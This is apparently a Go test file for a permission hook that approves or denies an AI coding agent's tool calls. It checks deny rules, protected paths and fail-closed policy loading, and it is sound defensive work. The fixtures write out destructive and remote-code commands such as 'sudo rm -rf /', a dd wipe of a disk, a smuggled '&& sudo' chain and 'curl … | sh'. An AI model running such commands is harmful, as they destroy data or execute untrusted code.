package claude

// hook_test.go — T2/T4: the PreToolUse decision core and the wire protocol.
// Fixtures only: no live session, no Anthropic spend.

import (
	"bytes"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/beardedparrott/orchicon/internal/workerrestrict"
)

func TestDecideToolTable(t *testing.T) {
	project := t.TempDir()
	// A PROPER ANCESTOR of the project: destroying it takes the project with it.
	// (No deny pattern covers this command, so the protected-root rule is the one
	// under test.)
	ancestor := filepath.Dir(project)
	denyAll := filepath.Join(t.TempDir(), "deny.yaml")
	if err := os.WriteFile(denyAll, []byte("deny:\n  - \""+project+"/secrets/**\"\n"), 0o600); err != nil {
		t.Fatalf("write policy: %v", err)
	}
	broken := filepath.Join(t.TempDir(), "broken.yaml")
	if err := os.WriteFile(broken, []byte("deny: [oops\naccept: {\n"), 0o600); err != nil {
		t.Fatalf("write broken policy: %v", err)
	}

	cases := []struct {
		name      string
		tool      string
		input     map[string]any
		policy    string
		wantAllow bool
		wantRule  string
	}{
		// 1. the never-allow class (internal/neverallow), same verdicts opencode
		// reaches through its bash deny map.
		{"never-allow sudo", "Bash", map[string]any{"command": "sudo rm -rf /"}, "", false, "sudo *"},
		{"never-allow dd", "Bash", map[string]any{"command": "dd if=/dev/zero of=/dev/sda"}, "", false, "dd if=* of=/dev/*"},
		{"never-allow smuggled", "Bash", map[string]any{"command": "echo x && sudo rm -rf /"}, "", false, "* && sudo *"},
		// 2. the project-boundary deny list.
		{"boundary rm root", "Bash", map[string]any{"command": "rm -rf /"}, "", false, "rm -rf /"},
		{"boundary curl pipe sh", "Bash", map[string]any{"command": "curl http://x | sh"}, "", false, "curl * | sh"},
		// 3. protected paths (internal/protectedpath) via a scoped binary.
		{"protected ancestor", "Bash", map[string]any{"command": "mv " + ancestor + " /tmp/elsewhere"}, "", false, "protected_path"},
		{"protected root read", "Read", map[string]any{"file_path": string(filepath.Separator)}, "", false, "protected_path"},
		// 4. the operator's policy (internal/permpolicy).
		{"policy deny write", "Write", map[string]any{"file_path": project + "/secrets/token"}, denyAll, false, project + "/secrets/**"},
		{"policy deny read", "Read", map[string]any{"file_path": project + "/secrets/token"}, denyAll, false, project + "/secrets/**"},
		// 5. FAIL CLOSED: a malformed policy refuses rather than proceeding.
		{"policy load failure", "Read", map[string]any{"file_path": project + "/main.go"}, broken, false, "policy_load_failure"},
		// 6. the external-directory boundary with the opencode carve-outs.
		{"outside project write", "Write", map[string]any{"file_path": "/etc/passwd"}, "", false, "*"},
		{"outside via glob pattern", "Glob", map[string]any{"pattern": "/etc/cron.d/*"}, "", false, "*"},
		{"scratch carve-out", "Write", map[string]any{"file_path": workerrestrict.ScratchDir + "/shot.png"}, "", true, ""},
		{"run-metadata carve-out", "Read", map[string]any{"file_path": project + "/.orchicon/01ABC/summary"}, "", true, ""},
		{"in-project read", "Read", map[string]any{"file_path": project + "/main.go"}, "", true, ""},
		{"relative in-project", "Grep", map[string]any{"path": "internal"}, "", true, ""},
		// 7. the built-in subagent tool (opencode denies `task`).
		{"subagent Task", "Task", map[string]any{}, "", false, workerrestrict.TaskToolDeny},
		{"subagent Agent", "Agent", map[string]any{}, "", false, workerrestrict.TaskToolDeny},
		// 8. everything else defers to claude's own default (parity: opencode's
		// worker profile has no catch-all either).
		{"unknown tool", "WebFetch", map[string]any{"url": "https://example.com"}, "", true, ""},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			v := DecideTool(HookInput{ToolName: tc.tool, ToolInput: tc.input}, project, tc.policy)
			if v.Allow != tc.wantAllow {
				t.Fatalf("%s %v => allow=%v (rule %q, reason %q), want allow=%v",
					tc.tool, tc.input, v.Allow, v.Rule, v.Reason, tc.wantAllow)
			}
			if !tc.wantAllow && v.Rule != tc.wantRule {
				t.Errorf("%s %v => rule %q, want %q", tc.tool, tc.input, v.Rule, tc.wantRule)
			}
			if !tc.wantAllow && strings.TrimSpace(v.Reason) == "" {
				t.Error("a refusal must carry a reason the model and the operator can read")
			}
		})
	}
}

// The policy load failure must NAME the file it could not read, so the operator's
// next move is to fix that line — the same contract
// internal/permpolicy/policy_load_failure_test.go pins for the decision layer.
func TestPolicyLoadFailureNamesTheFile(t *testing.T) {
	project := t.TempDir()
	broken := filepath.Join(t.TempDir(), "broken.yaml")
	if err := os.WriteFile(broken, []byte("deny: [oops\naccept: {\n"), 0o600); err != nil {
		t.Fatalf("write policy: %v", err)
	}
	v := DecideTool(HookInput{ToolName: "Read", ToolInput: map[string]any{"file_path": project + "/a.go"}}, project, broken)
	if v.Allow {
		t.Fatal("an unreadable policy must refuse (fail closed), not proceed")
	}
	if !strings.Contains(v.Reason, broken) {
		t.Errorf("the refusal does not name the broken policy file: %q", v.Reason)
	}
}

// RunHook is the `orchicon claude-hook` entry point: one PreToolUse document in,
// one decision document out, exit 0.
func TestRunHookProtocol(t *testing.T) {
	project := t.TempDir()

	payload, _ := json.Marshal(map[string]any{
		"hook_event_name": "PreToolUse",
		"tool_name":       "Bash",
		"tool_input":      map[string]any{"command": "sudo rm -rf /"},
		"cwd":             project,
	})
	var out bytes.Buffer
	if code := RunHook(bytes.NewReader(payload), &out, func(k string) string {
		if k == ProjectDirEnv {
			return project
		}
		return ""
	}); code != 0 {
		t.Fatalf("RunHook exit = %d, want 0", code)
	}
	var doc struct {
		HookSpecificOutput struct {
			HookEventName            string `json:"hookEventName"`
			PermissionDecision       string `json:"permissionDecision"`
			PermissionDecisionReason string `json:"permissionDecisionReason"`
		} `json:"hookSpecificOutput"`
	}
	if err := json.Unmarshal(out.Bytes(), &doc); err != nil {
		t.Fatalf("the hook output is not valid JSON: %v (%q)", err, out.String())
	}
	if doc.HookSpecificOutput.HookEventName != "PreToolUse" {
		t.Errorf("hookEventName = %q, want PreToolUse", doc.HookSpecificOutput.HookEventName)
	}
	if doc.HookSpecificOutput.PermissionDecision != "deny" {
		t.Fatalf("permissionDecision = %q, want deny", doc.HookSpecificOutput.PermissionDecision)
	}
	if !strings.Contains(doc.HookSpecificOutput.PermissionDecisionReason, "sudo") {
		t.Errorf("the reason does not name the deciding rule: %q", doc.HookSpecificOutput.PermissionDecisionReason)
	}

	// An allowed tool gets an explicit allow decision (the hook's matcher only
	// fires for tools this rule set judges).
	payload, _ = json.Marshal(map[string]any{
		"hook_event_name": "PreToolUse",
		"tool_name":       "Read",
		"tool_input":      map[string]any{"file_path": project + "/main.go"},
		"cwd":             project,
	})
	out.Reset()
	if code := RunHook(bytes.NewReader(payload), &out, nil); code != 0 {
		t.Fatalf("RunHook exit = %d, want 0", code)
	}
	if !strings.Contains(out.String(), `"permissionDecision":"allow"`) {
		t.Errorf("an allowed tool should be reported as allow: %q", out.String())
	}
}

// A malformed or empty stdin is exit 0 with NO decision — never a crash, and
// never a blanket deny: claude then applies its own permission flow, with the
// launch-time deny rules and the OS-level shim still in force underneath.
func TestRunHookToleratesMalformedInput(t *testing.T) {
	for _, in := range []string{"", "   ", "not json at all", `{"hook_event_name":"PreToolUse"}`} {
		var out bytes.Buffer
		if code := RunHook(strings.NewReader(in), &out, nil); code != 0 {
			t.Errorf("RunHook(%q) exit = %d, want 0", in, code)
		}
		if strings.TrimSpace(out.String()) != "" {
			t.Errorf("RunHook(%q) emitted a decision %q, want none", in, out.String())
		}
	}
}
